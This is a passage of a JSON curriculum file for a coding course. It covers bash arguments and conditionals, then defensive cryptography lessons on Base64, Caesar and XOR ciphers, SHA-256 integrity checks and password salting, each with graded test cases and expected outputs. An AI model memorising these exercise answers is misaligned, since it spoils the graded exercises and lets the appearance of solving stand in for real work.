& 9: ^$2^ prints the agent name, and ^$1^ prints the role.\n\n## Predict & Observe\n\nWhat would happen if you printed ^$3^ when only two arguments were set? In bash, referencing an unset positional argument evaluates safely to an empty string (\"\") without throwing an error.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Sets positional arguments to ^\"Recon\"^ and ^\"Falcon\"^ using ^set -- \"Recon\" \"Falcon\"^.\n2. Prints ^\"Agent count: $#\"^ using ^echo^.\n3. Prints ^\"Welcome, Agent $2! Assigned role: $1.\"^ using ^echo^.\n4. Sets positional arguments to ^\"Infiltration\"^ and ^\"Shadow\"^ using ^set -- \"Infiltration\" \"Shadow\"^.\n5. Prints ^\"Agent count: $#\"^ using ^echo^.\n6. Prints ^\"Welcome, Agent $2! Assigned role: $1.\"^ using ^echo^.","starter":"# Scripting Lesson 5.1: Positional Arguments\n# Use set -- to assign parameters and print formatted agent greetings\n\n","hint":"Use \"set -- \\\"Recon\\\" \\\"Falcon\\\"\", echo agent count and welcome with $2 and $1, then repeat for Shadow.","terms":[{"term":"positional argument","def":"A parameter passed to a script or function, accessed via $1, $2, etc."},{"term":"$1, $2","def":"The first and second command-line arguments provided to the script."},{"term":"$#","def":"Special variable containing the total number of positional arguments."},{"term":"$0","def":"Special variable containing the name of the script being executed."}],"image":{"url":"/diagrams/linux/bash-args.svg","caption":"Positional Arguments: Map incoming command flags to $1, $2, and argument count $#"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Handle positional arguments $1, $2, and $#","input":"","expected":"Agent count: 2\nWelcome, Agent Falcon! Assigned role: Recon.\nAgent count: 2\nWelcome, Agent Shadow! Assigned role: Infiltration."}],"usesInput":false,"hasHarness":false},{"id":"bash-conditionals","number":"5.2","title":"Making Decisions: if, then, else","content":"## Concept Hook: The Matrix Red Pill or Blue Pill\n\nIn *The Matrix*, Morpheus stands before Neo with two open palms:\n*\"You take the blue pill—the story ends, you wake up in your bed and believe whatever you want to believe. You take the red pill—you stay in Wonderland, and I show you how deep the rabbit hole goes.\"*\n\nA computer script becomes genuinely intelligent the moment it can evaluate conditions and choose different paths. In Bash, you make decisions using the **if / then / else** construct.\n\n## Plain English: How Bash Conditionals Work\n\nThe anatomy of a bash conditional looks like this:\n\n~~~\nif [ condition ]; then\n    # commands if true\nelse\n    # commands if false\nfi\n~~~\n\nNotice two crucial syntax rules that catch every beginner:\n1. **The spaces inside brackets are MANDATORY!** You must write ^[ condition ]^ with a space after ^[^ and before ^]^. If you write ^[condition]^, bash will crash!\n2. Every ^if^ block must conclude with **fi** (^if^ spelled backwards).\n\nCommon test operators inside brackets:\n- ^-f \"$file\"^ tests if a regular file exists on disk.\n- ^! -f \"$file\"^ tests if a file DOES NOT exist.\n- ^-d \"$dir\"^ tests if a directory exists.\n- ^-z \"$str\"^ tests if a text string is empty (length 0).\n- ^\"$a\" = \"$b\"^ tests if two strings are identical.\n\n## Pop Culture & Soul\n\nAutomated server backup systems, space probes, and cybersecurity monitors run thousands of these checks every minute. If disk space is low, trigger an alarm; if backup files are missing, alert the on-call engineer.\n\n## Code Walkthrough\n\n~~~\n# Check if the primary sensor file exists\nif [ -f \"telemetry/sensor.dat\" ]; then\n    echo \"Sensor data found: reading telemetry\"\n    cat telemetry/sensor.dat\nelse\n    echo \"Sensor data missing!\"\nfi\n\n# Check if the backup file is missing\nif [ ! -f \"telemetry/backup.dat\" ]; then\n    echo \"Warning: Backup missing\"\nfi\n~~~\n\n- Line 2: ^[ -f \"telemetry/sensor.dat\" ]^ checks if the file exists. Because it does, lines 3-4 run.\n- Line 10: ^[ ! -f \"telemetry/backup.dat\" ]^ checks if the backup is missing. Because it is absent, line 11 executes.\n\n## Predict & Observe\n\nWhat would happen if you removed the space after ^[^, writing ^if [-f \"file\"];^? Bash would attempt to execute a non-existent command named ^[-f^ and fail. Always leave breathing room around brackets!\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Checks if ^telemetry/sensor.dat^ exists using ^if [ -f \"telemetry/sensor.dat\" ]; then^.\n   - If it exists, prints ^\"Sensor data found: reading telemetry\"^ and outputs the file with ^cat telemetry/sensor.dat^.\n   - Otherwise, prints ^\"Sensor data missing!\"^.\n2. Checks if ^telemetry/backup.dat^ is missing using ^if [ ! -f \"telemetry/backup.dat\" ]; then^.\n   - If missing, prints ^\"Warning: Backup missing\"^.","starter":"# Scripting Lesson 5.2: Conditionals\n# Test if sensor.dat exists, and warn if backup.dat is missing\n\n","hint":"Remember spaces inside brackets: \"if [ -f \\\"telemetry/sensor.dat\\\" ]; then\". Close each if with \"fi\".","terms":[{"term":"if / then / else","def":"Conditional statement in bash that executes code blocks based on whether a test succeeds."},{"term":"fi","def":"Keyword that closes an if statement block in bash (if backwards)."},{"term":"-f","def":"Test operator that checks if a specified path exists and is a regular file."},{"term":"!","def":"Logical NOT operator; inverts the condition (true becomes false, false becomes true)."}],"image":{"url":"/diagrams/linux/bash-conditionals.svg","caption":"Conditional Logic: if [ condition ]; then ... else ... fi with test operators"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Evaluate sensor file existence and backup status","input":"","expected":"Sensor data found: reading telemetry\nTemperature: 45C\nPressure: 101.3 kPa\nWarning: Backup missing"}],"usesInput":false,"hasHarness":false},{"id":"unit-5-test","number":"5.3","title":"Unit 5 Capstone Test: NASA Space Mission Pre-Flight Health Check","content":"## The Mission: Apollo Launch Countdown\n\n**Priority Broadcast from Launch Control Center, Cape Canaveral:**\n\n*\"Flight Directors, this is Launch Control. The countdown has halted at T-minus 30 seconds for the automated Pre-Flight Readiness Poll. Before the Flight Director can give the final GO for launch, our automated shell script must verify life support oxygen reserves, confirm propulsion fuel pressure, count verified checklist items, lock down the flight manifest, and clear the spacecraft for orbital insertion!\"*\n\nYou are NASA's Chief Flight Software Engineer. This is the ultimate capstone of your Linux command line journey.\n\n## The Specification\n\nWrite an end-to-end automated pre-flight health check script in ^script.sh^ that executes the following sequence:\n\n1. Test if **both** ^systems/oxygen.ok^ and ^systems/fuel.ok^ exist using conditional testing:\n   - If both exist, print: ^Propulsion & Life Support: GO^\n   - Otherwise, print: ^Propulsion & Life Support: NO-GO^\n2. Count the number of verified items in ^logs/checklist.txt^ using ^wc -l < logs/checklist.txt^, and print:\n   ^Checklist items verified: <count>^\n3. Create an official flight manifest file named ^flight_manifest.log^:\n   - Write ^MISSION=APOLLO_L4F^ using overwrite ^>^.\n   - Append ^STATUS=FLIGHT_READY^ using append ^>>^.\n4. Secure the flight manifest against accidental edits by making it read-only (^chmod 444 flight_manifest.log^).\n5. Verify that ^flight_manifest.log^ exists on disk using ^if [ -f \"flight_manifest.log\" ]; then^:\n   - Print: ^Flight manifest secured: READY^\n6. Output the final launch clearance:\n   ^Pre-flight check complete. Ready for launch.^\n\n## Expected Output\n\nYour script must produce the following pre-flight telemetry:\n\n~~~\nPropulsion & Life Support: GO\nChecklist items verified: 3\nFlight manifest secured: READY\nPre-flight check complete. Ready for launch.\n~~~\n\nAll systems are green. Ignite the Saturn V engines and soar into the cosmos!","starter":"# Unit 5 Capstone: NASA Space Mission Pre-Flight Health Check\n# Verify oxygen & fuel, count checklist items, generate and lock manifest, and issue launch GO\n\n","hint":"Check both files with \"&&\", count lines with \"$(wc -l < logs/checklist.txt)\", write/append to manifest, chmod 444, test file with if, and echo final message.","terms":[{"term":"capstone","def":"The culminating project demonstrating mastery of all skills acquired across the curriculum."},{"term":"chmod 444","def":"Sets read-only permissions for User, Group, and Others (r--r--r--)."},{"term":"command substitution","def":"$(command): executes a command and inserts its output text directly into the string."}],"image":{"url":"/diagrams/linux/unit-5-test.svg","caption":"Unit 5 Capstone: NASA Cape Canaveral Automated Launch Health Check"},"isUnitTest":true,"fileName":"script.sh","tests":[{"name":"Perform NASA automated pre-flight health check","input":"","expected":"Propulsion & Life Support: GO\nChecklist items verified: 3\nFlight manifest secured: READY\nPre-flight check complete. Ready for launch."}],"usesInput":false,"hasHarness":false}]}]},{"id":"cybersecurity","title":"Practical Cybersecurity","language":"Python","languageId":"cybersecurity","description":"Learn defensive cybersecurity: cryptography, hashing & password salting, SQL injection & XSS mitigation, network packet inspection, and secure coding.","units":[{"id":"cryptography-foundations","title":"Foundations of Cryptography & Encoding","lessons":[{"id":"encoding-vs-encryption","number":"1.1","title":"Encoding vs. Encryption","content":"## The Cellophane Wrap vs. The Titanium Safe\n\nImagine you want to mail a secret diary. You wrap the pages in transparent cellophane film to protect them from raindrops during shipping. The mail carrier, the postal clerks, and anyone standing nearby can read every single sentence straight through the clear plastic. That is **encoding**.\n\nNow imagine placing those pages inside a heavy titanium lockbox with a six-digit combination dial. You turn the dial to lock it. Even if a thief steals the box off the truck, they cannot read a single word unless they know the secret combination. That is **encryption**.\n\nThe golden rule of cybersecurity: **Encoding is NOT encryption!**\n\n## What is Base64 and Hexadecimal?\n\nComputers communicate using electrical binary pulses (zeros and ones). When programs send images, audio, or binary files over protocols designed for plain text (such as email or web pages), binary bytes can break the connection. \n\n- **Hexadecimal (Hex)**: Represents each byte (8 bits) as two characters using numbers ^0-9^ and letters ^a-f^. For example, the character ^'H'^ has the byte value ^72^ in decimal, which is written as ^48^ in hex.\n- **Base64**: Chunks binary data into 6-bit pieces and maps each piece to one of 64 standard printable ASCII characters (^A-Z^, ^a-z^, ^0-9^, ^+^, ^/^). If the data length isn't a multiple of 3 bytes, it adds padding with ^=^ signs.\n\nAnyone in the world can run ^base64.b64decode()^ without a password and get the original text back in a microsecond. Encoding provides **zero confidentiality**!\n\n## Pop Culture: The Secret Decoder Pin\n\nIn the holiday classic movie *A Christmas Story*, nine-year-old Ralphie Parker waits weeks for his Little Orphan Annie Secret Society decoder pin to arrive in the mail. When the radio announcer broadcasts the secret code, Ralphie furiously calculates the letters, expecting an earth-shattering secret mission. Instead, the decoded message reads: *\"Be sure to drink your Ovaltine.\"*\n\nRalphie learned a painful lesson: substitution codes and encodings don't protect data—they just make you look up values on a chart!\n\n## Code Walkthrough\n\nIn Python's standard library, the built-in ^bytes.hex()^ method converts bytes to hex, and the ^base64^ module handles Base64:\n\n~~~\nimport base64\n\nsecret = b\"Enigma\"\nprint(secret.hex())                 # \"456e69676d61\"\nprint(base64.b64encode(secret))     # b\"RW5pZ21h\"\n~~~\n\n## Predict & Observe\n\nWhat will happen if you send a customer's credit card number encoded in Base64 across the internet without HTTPS or AES encryption? \nAny eavesdropper on public Wi-Fi can run a single Base64 decode command and immediately obtain the plain credit card numbers!\n\n## Your Task\n\nWrite the function ^inspect_data(data_bytes: bytes)^ in ^security.py^.\nIt must:\n1. Decode and print the ASCII string: ^ASCII: <text>^\n2. Print the hexadecimal string: ^Hex: <hex_str>^\n3. Print the Base64 string: ^Base64: <b64_str>^\n4. Print the exact security warning: ^Confidentiality: None (Encoding is not encryption!)^","starter":"import base64\n\ndef inspect_data(data_bytes: bytes):\n    # TODO: Print ASCII, Hex, Base64, and the confidentiality warning.\n    pass\n","hint":"Use data_bytes.decode(\"ascii\"), data_bytes.hex(), and base64.b64encode(data_bytes).decode(\"ascii\").","terms":[{"term":"encoding","def":"Transforming data into another public format (like Base64 or Hex) so systems can transmit it. Requires zero secret keys to decode."},{"term":"encryption","def":"Scrambling plaintext into unreadable ciphertext using a mathematical algorithm and a secret key to ensure confidentiality."},{"term":"Base64","def":"An encoding format that turns arbitrary binary bytes into 64 printable characters for safe text transmission."},{"term":"hexadecimal","def":"Base-16 numeral system using 0-9 and a-f, where every byte is written as two hex characters."},{"term":"confidentiality","def":"The security guarantee that only authorized individuals possessing the secret key can view the data."}],"image":{"url":"/diagrams/cybersecurity/encoding-vs-encryption.svg","caption":"Encoding converts data formats for transport with NO secret key. Encryption scrambles data for confidentiality using a secret key."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Inspect \"Hello\"","input":"Hello\n","expected":"ASCII: Hello\nHex: 48656c6c6f\nBase64: SGVsbG8=\nConfidentiality: None (Encoding is not encryption!)"},{"name":"Inspect \"TopSecret\"","input":"TopSecret\n","expected":"ASCII: TopSecret\nHex: 546f70536563726574\nBase64: VG9wU2VjcmV0\nConfidentiality: None (Encoding is not encryption!)"},{"name":"Inspect \"Cyber\"","input":"Cyber\n","expected":"ASCII: Cyber\nHex: 4379626572\nBase64: Q3liZXI=\nConfidentiality: None (Encoding is not encryption!)"}],"usesInput":true,"hasHarness":true},{"id":"caesar-cipher","number":"1.2","title":"The Caesar Shift Cipher & Frequency Analysis","content":"## Julius Caesar's Battle Orders\n\nIn 50 BC, Julius Caesar needed to communicate with his generals across Gaul without enemy scouts reading his troop movements. He devised a system: replace every letter in the message with the letter three spots down the alphabet. ^'A'^ became ^'D'^, ^'B'^ became ^'E'^, and at the end of the alphabet, letters wrapped around: ^'X'^ became ^'A'^, ^'Y'^ became ^'B'^, and ^'Z'^ became ^'C'^.\n\nFor centuries, this worked because most enemies were illiterate. But in modern cybersecurity, the Caesar cipher has a fatal vulnerability: **the keyspace is microscopic**.\n\n## Keyspace and Modular Arithmetic\n\nThe **keyspace** is the set of all possible keys that could decrypt a cipher:\n- The English alphabet has 26 letters.\n- A shift of 0 or 26 does nothing (the message stays identical).\n- That leaves only **25 possible shifts**!\n\nA human can write down all 25 shifts on a napkin in five minutes. A Python program tests all 25 shifts in less than 0.001 seconds. This is called a **brute-force attack**.\n\nFurthermore, human languages are not random. In English, the letter **E** appears in about 12.7% of all text, followed by **T** (9.1%) and **A** (8.2%). Letters like **Z**, **Q**, and **X** appear rarely. Even if you don't know the shift, counting how often each letter appears (**frequency analysis**) instantly gives away the key.\n\n## Pop Culture: The Imitation Game\n\nIn the movie *The Imitation Game*, British codebreaker Alan Turing (played by Benedict Cumberbatch) works at Bletchley Park trying to break the German Enigma machine. The team realizes that because German weather stations always end their 6:00 AM transmissions with the exact same known phrase—*\"Heil Hitler\"*—they have a \"crib\" (known plaintext). Once you know one piece of expected text, you can test all keys until that phrase appears.\n\n## Code Walkthrough\n\nTo shift characters safely, we use modular arithmetic with the modulo operator ^%^:\n\n~~~\n# Shifting uppercase 'A' by shift 3:\nshifted_code = (ord('A') - ord('A') + 3) % 26 + ord('A')\nshifted_char = chr(shifted_code) # 'D'\n~~~\n\n## Predict & Observe\n\nIf an attacker intercepts the ciphertext ^\"Wkh hqhpb kdv iodqnhg rxu edvh\"^ and tests shifts 1 through 25, how long before they find real English words? By shift 3, the message turns into *\"The enemy has flanked our base\"*.\n\n## Your Task\n\nImplement three functions:\n1. ^caesar_encrypt(text: str, shift: int) -> str^: Shifts uppercase and lowercase letters by ^shift^. Leaves spaces, punctuation, and digits untouched.\n2. ^caesar_decrypt(text: str, shift: int) -> str^: Reverses the shift.\n3. ^caesar_crack(ciphertext: str, crib: str) -> int^: Tests shifts 1 through 25 to find which shift decrypts the message so that ^crib.lower()^ is found inside the decrypted text. Returns the integer shift (1 to 25), or -1 if not found.","starter":"def caesar_encrypt(text: str, shift: int) -> str:\n    # TODO: Shift alphabet letters by shift modulo 26\n    return \"\"\n\ndef caesar_decrypt(text: str, shift: int) -> str:\n    # TODO: Reverse the shift\n    return \"\"\n\ndef caesar_crack(ciphertext: str, crib: str) -> int:\n    # TODO: Test shifts 1 through 25, return shift where crib is in decrypted text\n    return -1\n","hint":"To decrypt with shift S, simply encrypt with -S. For cracking, loop over range(1, 26).","terms":[{"term":"Caesar cipher","def":"A substitution cipher where each letter is replaced by a letter a fixed number of positions down the alphabet."},{"term":"keyspace","def":"The total number of possible secret keys. A small keyspace makes a cipher vulnerable to brute-force guessing."},{"term":"modular arithmetic","def":"A system of arithmetic for integers where numbers wrap around upon reaching a certain value (the modulus), like a 12-hour clock."},{"term":"brute-force attack","def":"An attack that attempts every possible key systematically until the correct key is found."},{"term":"crib","def":"Known or suspected plaintext that an attacker searches for within decrypted candidates to confirm a cracked key."}],"image":{"url":"/diagrams/cybersecurity/caesar-cipher.svg","caption":"The Caesar cipher shifts each letter along the alphabet. With only 25 possible shifts, an attacker can brute-force all keys in milliseconds."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Encrypt message","input":"encrypt\nATTACK AT DAWN\n3\n","expected":"DWWDFN DW GDZQ"},{"name":"Decrypt message with mixed case and punctuation","input":"decrypt\nKhoor, Zruog!\n3\n","expected":"Hello, World!"},{"name":"Brute-force crack with crib","input":"crack\nWkh hqhpb kdv iodqnhg rxu idoo-edfn edvh\nbase\n","expected":"Key: 3 -> The enemy has flanked our fall-back base"}],"usesInput":true,"hasHarness":true},{"id":"xor-encryption","number":"1.3","title":"Bitwise XOR & The One-Time Pad","content":"## The Magic Reversible Toggle Switch\n\nIn electrical engineering, think of a toggle light switch on a wall. \n- You flip it once: the light turns **ON**.\n- You flip it again with the exact same motion: the light turns **OFF**.\n\nIn computer science, that toggle switch is the **XOR** (Exclusive OR) bitwise operator, written as ^^^ in Python.\nThe XOR rule is simple:\n- If two bits are identical (^0 ^ 0^ or ^1 ^ 1^), the answer is **0**.\n- If two bits are different (^1 ^ 0^ or ^0 ^ 1^), the answer is **1**.\n\nBecause of this property, XOR has an extraordinary mathematical identity:\n$$\\text{Plaintext} \\oplus \\text{Key} \\oplus \\text{Key} = \\text{Plaintext}$$\n\nIf you take a message and XOR its bytes with a secret key, you get scrambled ciphertext. If you take that ciphertext and XOR it with the exact same key again, the original plaintext pops back out!\n\n## The One-Time Pad (OTP)\n\nIn 1949, mathematician Claude Shannon published a proof that stunned the intelligence world: if you XOR a message with a truly random key that is **as long as the message** and **never reused**, the resulting ciphertext is **mathematically impossible to break**, even with an infinite supercomputer! This is known as a **One-Time Pad (OTP)**.\n\nWhy? Because every possible message of that length is equally probable. If the ciphertext is 5 letters long, the key could decrypt it to \"HELLO\", \"APPLE\", \"WATER\", or \"TIGER\" with identical statistical probability. There is zero information leaked.\n\n## Pop Culture: The Cold War Red Telephone\n\nDuring the Cold War, the Washington-Moscow direct communications link (popularly called the \"Red Telephone\", though it was actually a teletype telegraph) used One-Time Pad tapes. Couriers carrying sealed diplomatic pouches physically delivered reels of random punch tapes between Washington and Moscow to ensure presidential communications could never be decrypted by Soviet or American spies.\n\n## Code Walkthrough\n\nIn Python, we iterate through data bytes and key bytes, using modulo arithmetic ^i % len(key)^ to repeat the key if the message is longer than the key:\n\n~~~\ndata = b\"HELLO\"\nkey = b\"K\"\nciphertext = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))\ndecrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(ciphertext))\nprint(decrypted == data)  # True!\n~~~\n\n## Predict & Observe\n\nWhat happens if you use a key composed entirely of zeroes (^b\"\\x00\"^)?\nSince ^A ^ 0 = A^, the data remains completely unencrypted! The strength of XOR relies entirely on the randomness and secrecy of the key.\n\n## Your Task\n\nImplement ^xor_cipher(data: bytes, key: bytes) -> bytes^ in ^security.py^.\nIt must:\n1. Raise a ^ValueError(\"Key cannot be empty\")^ if ^key^ has length 0.\n2. XOR each byte of ^data^ with ^key[i % len(key)]^.\n3. Return the resulting ^bytes^ object.","starter":"def xor_cipher(data: bytes, key: bytes) -> bytes:\n    # TODO: Check key not empty, then XOR each byte of data with key[i % len(key)]\n    return b\"\"\n","hint":"Use a generator expression inside bytes(...) combining b ^ key[i % len(key)].","terms":[{"term":"XOR (Exclusive OR)","def":"A bitwise operation (symbol ^) that outputs 1 when bits differ and 0 when they match. Reversible: A ^ B ^ B = A."},{"term":"One-Time Pad (OTP)","def":"An encryption method using a random key of equal length to the plaintext, used once. Mathematically unbreakable."},{"term":"symmetric encryption","def":"A cryptographic system where the same secret key is used for both encryption and decryption."},{"term":"keystream","def":"A sequence of key characters or bytes applied successively to the plaintext to produce ciphertext."}],"image":{"url":"/diagrams/cybersecurity/xor-encryption.svg","caption":"XOR is the reversible toggle switch of cryptography: A ^ B ^ B = A. Encrypting twice with the same key recovers the original data."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"XOR with single-byte key","input":"HELLO\nK\n","expected":"CipherHex: 030e070704\nDecrypted: HELLO\nReversible: True"},{"name":"XOR with multi-byte repeating key","input":"MISSION ACCOMPLISHED\nSPYKEY\n","expected":"CipherHex: 1e190a180c161d70180806161e00150216111614\nDecrypted: MISSION ACCOMPLISHED\nReversible: True"}],"usesInput":true,"hasHarness":true},{"id":"unit-1-test","number":"1.4","title":"Unit 1 Test: Mission Impossible Multi-Layer Decoder","content":"## Operation Syndicate Intercept\n\n**Agent Ethan Hunt**, IMF intelligence has intercepted an encrypted radio transmission broadcast by an undercover Syndicate operative. The enemy knew that simple encodings or single ciphers could be spotted by automated listening posts. To evade detection, the operative layered three distinct security transformations:\n\n1. **Step 1 (At transmitter)**: The operative shifted the alphabet with a **Caesar Shift**.\n2. **Step 2 (At transmitter)**: The operative encrypted the shifted text's UTF-8 bytes using a repeating **XOR Key**.\n3. **Step 3 (At transmitter)**: The operative encoded the resulting binary ciphertext using **Base64** so it could be transmitted over radio channels.\n\nYour mission, should you choose to accept it, is to write the multi-layer decoder that reverses all three steps in the exact correct sequence and reveals the enemy's intelligence.\n\n## Pop Culture: Mission: Impossible\n\nIn *Mission: Impossible - Rogue Nation*, Ethan Hunt must dive into an underwater computer torus without oxygen tanks while Benji Dunn attempts to decode encrypted security profiles. If Benji misses a single layer of the authentication chain, the gate seals permanently. Every layer must be unwound in precise mathematical reverse order!\n\n## The Reverse Decoding Chain\n\nTo recover the original message:\n1. **Unwrap Layer 1**: Use ^base64.b64decode()^ to turn the incoming Base64 ASCII string back into raw encrypted bytes.\n2. **Unwrap Layer 2**: XOR the bytes with ^xor_key^ using your repeating key algorithm. Then decode those bytes back into a UTF-8 string.\n3. **Unwrap Layer 3**: Reverse the Caesar shift (shifting backwards by ^caesar_shift^) on letters ^A-Z^ and ^a-z^, keeping spaces and punctuation intact.\n\n## Your Task\n\nImplement ^decode_transmission(intercepted_b64: str, caesar_shift: int, xor_key: bytes) -> str^ in ^security.py^.\nIt must return the clean, original English message string.","starter":"import base64\n\ndef decode_transmission(intercepted_b64: str, caesar_shift: int, xor_key: bytes) -> str:\n    # TODO:\n    # 1. Base64 decode intercepted_b64 to raw bytes\n    # 2. XOR decipher bytes with xor_key, then decode to UTF-8 text\n    # 3. Reverse the Caesar shift on letters and return the plaintext\n    return \"\"\n","hint":"First base64.b64decode, then XOR with key, decode utf-8, then shift by -caesar_shift modulo 26.","terms":[{"term":"defense-in-depth","def":"Layering multiple security controls so that if one layer is compromised, additional layers continue to protect the asset."},{"term":"decoding pipeline","def":"Executing a sequence of inverse operations in exact reverse order to restore transformed data."}],"image":{"url":"/diagrams/cybersecurity/unit-1-test.svg","caption":"Ethan Hunt must peel back three nested defensive layers: Base64 transport encoding, Caesar shift cipher, and bitwise XOR key encryption."},"isUnitTest":true,"fileName":"security.py","tests":[{"name":"Rendezvous Transmission","input":"Hic1NiIwLyAzNWY5MXU8OiA+KDMlLG4zIyAoLCF1NzkjbSQ5Pz8jIDM1LHE=\n5\nIMF_HUNT\n","expected":"Rendezvous at midnight behind the warehouse."},{"name":"Syndicate Operative Alert","input":"Hz8qOyY1NmU1OyNwKjMtMCl0LiklODUpOiQ4dDknPzwrMzU3OG8gJzEvOTU8NSMjNWs=\n7\nTOPSECRET\n","expected":"Disavow the rogue syndicate operative immediately."}],"usesInput":true,"hasHarness":true}]},{"id":"hashing-passwords","title":"Hashing, Integrity & Password Security","lessons":[{"id":"hash-functions","number":"2.1","title":"Cryptographic Hashes & The Avalanche Effect","content":"## The Kitchen Blender & The Digital Fingerprint\n\nImagine tossing strawberries, bananas, milk, and chocolate into a high-speed kitchen blender. You push the button for five seconds. Out comes a thick, pinkish-brown smoothie. \n\nNow, can you run the blender in reverse to pull intact strawberries and bananas back out of that smoothie? Of course not! \n\nA **cryptographic hash function** is that mathematical blender. It takes an input of any length—a single letter, a 500-page novel, or an entire 4-gigabyte operating system installer—and crunches it into a fixed-length string of characters (called a **digest** or **hash**).\n\n## The Three Core Properties of a Hash Function\n\n1. **Deterministic**: The same input always produces the exact same hash output.\n2. **One-Way (Pre-image Resistance)**: It is computationally impossible to reverse the hash back into the original input.\n3. **The Avalanche Effect**: Changing even a single letter, space, or comma in the input causes approximately 50% of the output bits to flip, producing a completely unrecognizable hash!\n\n## Pop Culture: National Treasure & The Museum Seal\n\nIn the adventure movie *National Treasure*, Benjamin Franklin Gates (Nicolas Cage) inspects historical documents looking for unaltered wax seals. If a wax seal was broken or stamped with a different ring, the King's guards immediately knew the treaty had been tampered with.\n\nToday, software distributors use **SHA-256** (Secure Hash Algorithm 256-bit) as digital wax seals. When you download Linux or an open-source tool, the website displays a SHA-256 hash. After downloading, you hash the file on your machine. If the hashes match, your file is authentic. If a hacker infected the file with malware, the hash changes completely!\n\n## Code Walkthrough\n\nPython's built-in ^hashlib^ module provides standard cryptographic hashing:\n\n~~~\nimport hashlib\n\ndata = \"Attack at dawn\"\ndigest = hashlib.sha256(data.encode('utf-8')).hexdigest()\nprint(digest)\n# a8f2... (64 hex characters)\n\n# Notice what happens if we add just one period:\ntampered = \"Attack at dawn.\"\nprint(hashlib.sha256(tampered.encode('utf-8')).hexdigest())\n# 4e01... (completely different!)\n~~~\n\n## Predict & Observe\n\nCan two different files ever produce the exact same hash? \nWhen two different inputs produce the exact same hash, it is called a **collision**. For secure algorithms like SHA-256, finding a collision would require more energy than boiling the Earth's oceans!\n\n## Your Task\n\nWrite two functions in ^security.py^:\n1. ^compute_hash(text: str) -> str^: Returns the 64-character SHA-256 hexadecimal string of the UTF-8 encoded text.\n2. ^verify_integrity(original_hash: str, downloaded_text: str) -> None^:\n   - Computes the hash of ^downloaded_text^.\n   - If it matches ^original_hash^, prints: ^INTEGRITY VERIFIED: Hashes match.^\n   - If it does not match, prints: ^TAMPERING DETECTED! Expected <original_hash> but got <computed_hash>^","starter":"import hashlib\n\ndef compute_hash(text: str) -> str:\n    # TODO: Return SHA-256 hex digest\n    return \"\"\n\ndef verify_integrity(original_hash: str, downloaded_text: str) -> None:\n    # TODO: Compare computed hash with original_hash and print verdict\n    pass\n","hint":"Use hashlib.sha256(text.encode(\"utf-8\")).hexdigest() to compute the hash.","terms":[{"term":"cryptographic hash","def":"A mathematical algorithm that maps data of arbitrary size to a fixed-size string of characters. Strictly one-way."},{"term":"SHA-256","def":"A member of the Secure Hash Algorithm 2 family producing a 256-bit (64 hex character) digest."},{"term":"Avalanche Effect","def":"The property where a tiny change in input (like 1 bit) produces a massive, unpredictable change in the output hash."},{"term":"digest","def":"The fixed-length output string generated by a cryptographic hash function."},{"term":"integrity","def":"The assurance that data has not been modified, deleted, or tampered with in transit."}],"image":{"url":"/diagrams/cybersecurity/hash-functions.svg","caption":"Cryptographic hash functions are strictly one-way trapdoors. Modifying a single character triggers the Avalanche Effect, completely transforming the 256-bit digest."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Authentic Download Verification","input":"ca1a1e63a10e8172918b6a7498e8900dd240832e9d365360718b9c37b681bef4\nOfficial Software Release v2.0\n","expected":"INTEGRITY VERIFIED: Hashes match."},{"name":"Tampered Download Alert","input":"ca1a1e63a10e8172918b6a7498e8900dd240832e9d365360718b9c37b681bef4\nOfficial Software Release v2.0 with backdoors!\n","expected":"TAMPERING DETECTED! Expected ca1a1e63a10e8172918b6a7498e8900dd240832e9d365360718b9c37b681bef4 but got 59a137be32c782fde3440699e35777c30e9938e3db004b7bedc7525b77483954"}],"usesInput":true,"hasHarness":true},{"id":"salting-passwords","number":"2.2","title":"Rainbow Tables & Password Salting","content":"## The Rainbow Table Threat\n\nSuppose an e-commerce website stores user passwords using plain SHA-256 hashes. Out of 100,000 registered users, 3,000 of them picked the password ^\"password123\"^.\n\nBecause hash functions are deterministic, the hash of ^\"password123\"^ is *always* ^ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f^. In the stolen database, all 3,000 users have the exact same hash!\n\nHackers don't bother guessing passwords one by one. Instead, they pre-compute lookup tables containing billions of words and their corresponding hashes. These lookup dictionaries are called **Rainbow Tables**. When a database leaks, a hacker does a quick table lookup and cracks millions of passwords in seconds.\n\n## Adding a Pinch of Salt\n\nThe defense is simple and powerful: **salting**.\nA **salt** is a sequence of random bytes generated individually for each user when they register:\n1. When Alice registers with password ^\"dragon\"^, the server generates a random salt (e.g., ^\"s4Lt_A\"^).\n2. The server hashes ^salt + password^: ^sha256(\"s4Lt_A\" + \"dragon\")^ -> ^8c12...^\n3. The server stores ^s4Lt_A$8c12...^ in the database.\n4. When Bob registers with the exact same password ^\"dragon\"^, the server generates a *different* random salt (^\"x9Zq_B\"^).\n5. The server hashes ^\"x9Zq_B\" + \"dragon\"^ -> ^2f7a...^\n\nEven though Alice and Bob chose identical passwords, their stored hashes are totally different! A hacker's pre-computed Rainbow Table is rendered completely useless.\n\n## Pop Culture: Gordon Ramsay & The LinkedIn 2012 Breach\n\nIn 2012, professional networking platform LinkedIn suffered a catastrophic security breach: 6.5 million user passwords were stolen. Why was it so disastrous? LinkedIn had stored the passwords using unsalted SHA-1 hashes! Within days, independent researchers had cracked over 90% of the entire database using Rainbow Tables.\n\nAs celebrity chef Gordon Ramsay yells in the kitchen: *\"It needs seasoning! Where is the salt?!\"* A database of unsalted password hashes is an open invitation for disaster.\n\n## Code Walkthrough\n\nWe store salted passwords in the standard format ^salt$hash^:\n\n~~~\nimport hashlib\n\ndef create_salted_record(password: str, salt: str) -> str:\n    combined = (salt + password).encode('utf-8')\n    h = hashlib.sha256(combined).hexdigest()\n    return salt + \"$\" + h\n~~~\n\n## Predict & Observe\n\nDoes the salt need to be kept secret like a password?\nNo! The salt is stored in plain text right next to the hash in the database. The purpose of a salt is not to hide itself, but to force the attacker to recompute custom hashes for every single user, eliminating pre-computed Rainbow Tables.\n\n## Your Task\n\nImplement two functions in ^security.py^:\n1. 